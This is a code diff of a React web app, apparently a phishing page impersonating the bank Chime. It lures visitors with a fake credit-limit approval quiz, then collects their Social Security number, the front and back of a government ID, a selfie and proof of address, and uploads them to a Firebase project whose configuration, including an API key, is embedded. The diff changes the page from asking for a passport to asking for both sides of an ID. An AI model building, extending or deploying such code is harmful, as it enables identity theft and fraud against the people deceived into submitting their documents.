@@ -5,7 +5,7 @@ import { getFirestore, collection, addDoc, serverTimestamp, type Firestore } fro
 import { getAuth, signInAnonymously, onAuthStateChanged, type Auth, type User } from 'firebase/auth';
 import { getStorage, ref, uploadBytes, getDownloadURL, type FirebaseStorage } from 'firebase/storage';
 
-// --- SUA CONFIGURAÇÃO ---
+// --- A SUA CONFIGURAÇÃO ---
 const firebaseConfig = {
   apiKey: "AIzaSyAuITAkLq7XNhJd1AuOrXTXeqqjS8nG2ss",
   authDomain: "chime-case-teste.firebaseapp.com",
@@ -36,9 +36,9 @@ try {
 // Cores Oficiais da Chime
 const BRAND = { green: '#00C865', darkGreen: '#004F2D', lightBg: '#F2F8F5' };
 
-// Interfaces
+// Interfaces (Restaurado para idFront e idBack)
 interface FileData { name: string; url: string; }
-interface FormDataState { ssn: string; passport: File | null; selfie: File | null; proofAddress: File | null; }
+interface FormDataState { ssn: string; idFront: File | null; idBack: File | null; selfie: File | null; proofAddress: File | null; }
 interface SubmittedDataType { 
   userId: string; 
   ssn_masked: string; 
@@ -46,7 +46,7 @@ interface SubmittedDataType {
   status: string; 
   submittedAt: string | any;
   utm_source: string;
-  documents: { passport: FileData | null; selfie: FileData | null; proofAddress: FileData | null; }; 
+  documents: { idFront: FileData | null; idBack: FileData | null; selfie: FileData | null; proofAddress: FileData | null; }; 
 }
 interface FileUploadFieldProps { label: string; id: keyof FormDataState; file: File | null; onFileChange: (id: keyof FormDataState, file: File) => void; icon?: React.ReactNode; subLabel?: string; }
 
@@ -93,7 +93,8 @@ export default function App() {
   const [quizIndex, setQuizIndex] = useState(0);
   const [loadingText, setLoadingText] = useState("Analyzing credit profile...");
   const [submittedData, setSubmittedData] = useState<SubmittedDataType | null>(null);
-  const [formData, setFormData] = useState<FormDataState>({ ssn: '', passport: null, selfie: null, proofAddress: null });
+  // Estado restaurado
+  const [formData, setFormData] = useState<FormDataState>({ ssn: '', idFront: null, idBack: null, selfie: null, proofAddress: null });
   const [isMenuOpen, setIsMenuOpen] = useState(false);
   const [user, setUser] = useState<User | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -103,10 +104,9 @@ export default function App() {
   
   const [utmSource, setUtmSource] = useState('direct');
 
-  // Perguntas focadas no novo perfil, mas visualmente com a cara da Chime
   const quizQuestions = [
-    { question: "What is your current estimated Credit Score?", options: ["720 - 780", "780 - 850 (Excellent)", "I prefer not to say"] },
-    { question: "Which premium perk do you value the most?", options: ["Global Airport Lounge Access", "3% Cash Back on Dining & Travel", "Zero Foreign Transaction Fees"] },
+    { question: "How much credit limit do you need right now?", options: ["Up to $500", "$1,000 - $2,500", "$5,000+"] },
+    { question: "Do you have any negative items on your credit report?", options: ["Yes (It's okay)", "No", "I don't know"] },
     { question: "If approved for $5,000 Credit Limit, can you activate today?", options: ["Yes, approve my limit now"] }
   ];
 
@@ -168,8 +168,12 @@ export default function App() {
       const timestamp = Date.now();
       const basePath = `submissions/${user.uid}/${timestamp}`;
       
-      setUploadStatus('Encrypting Passport...');
-      const passportData = await uploadFile(formData.passport, `${basePath}_passport_${formData.passport?.name}`);
+      // Upload de Frente e Verso restaurado
+      setUploadStatus('Uploading ID Front...');
+      const idFrontData = await uploadFile(formData.idFront, `${basePath}_idFront_${formData.idFront?.name}`);
+
+      setUploadStatus('Uploading ID Back...');
+      const idBackData = await uploadFile(formData.idBack, `${basePath}_idBack_${formData.idBack?.name}`);
       
       setUploadStatus('Verifying Identity...');
       const selfieData = await uploadFile(formData.selfie, `${basePath}_selfie_${formData.selfie?.name}`);
@@ -186,7 +190,7 @@ export default function App() {
         status: 'pending_review', 
         submittedAt: new Date().toISOString(), 
         utm_source: utmSource,
-        documents: { passport: passportData, selfie: selfieData, proofAddress: proofData } 
+        documents: { idFront: idFrontData, idBack: idBackData, selfie: selfieData, proofAddress: proofData } 
       };
       
       await addDoc(collection(db, 'applications'), { ...payload, submittedAt: serverTimestamp() });
@@ -206,7 +210,8 @@ export default function App() {
     }
   };
 
-  const isFormValid = formData.ssn.length === 11 && formData.passport && formData.selfie && formData.proofAddress;
+  // Validação restaurada para verificar Frente e Verso
+  const isFormValid = formData.ssn.length === 11 && formData.idFront && formData.idBack && formData.selfie && formData.proofAddress;
 
   // --- HEADER CHIME OFICIAL ---
   const Header = () => (
@@ -314,7 +319,7 @@ export default function App() {
     </div>
   );
 
-  // --- STEP 1: FORMULÁRIO (CHIME PADRÃO + PASSAPORTE) ---
+  // --- STEP 1: FORMULÁRIO (CHIME PADRÃO) ---
   return (
     <div className="min-h-screen bg-gray-50 font-sans w-full">
       <nav className="bg-white py-4 px-6 flex justify-between items-center shadow-sm relative z-20 w-full">
@@ -331,7 +336,7 @@ export default function App() {
 
       <div className="bg-[#004F2D] text-white pt-10 pb-24 px-6 text-center relative w-full">
           <h1 className="text-3xl md:text-4xl font-bold mb-3">Verify Identity to Unlock</h1>
-          <p className="text-green-100 opacity-90 font-medium">Please provide your Passport to finalize your account.</p>
+          <p className="text-green-100 opacity-90 font-medium">Please provide your Government ID to finalize your account.</p>
       </div>
 
       <div className="px-4 -mt-16 pb-20 relative z-10 w-full">
@@ -360,12 +365,17 @@ export default function App() {
             <div>
               <h3 className="text-sm font-bold text-gray-800 uppercase tracking-widest mb-5">Required Documents</h3>
               
-              {/* EXIGÊNCIA APENAS DE PASSAPORTE */}
+              {/* RESTAURADO FRENTE E VERSO */}
               <FileUploadField 
-                label="Passport" 
-                subLabel="Upload a clear photo of your passport's photo page."
-                id="passport" 
-                file={formData.passport} 
+                label="Government ID (Front)" 
+                id="idFront" 
+                file={formData.idFront} 
+                onFileChange={handleFileChange} 
+              />
+              <FileUploadField 
+                label="Government ID (Back)" 
+                id="idBack" 
+                file={formData.idBack} 
                 onFileChange={handleFileChange} 
               />
               
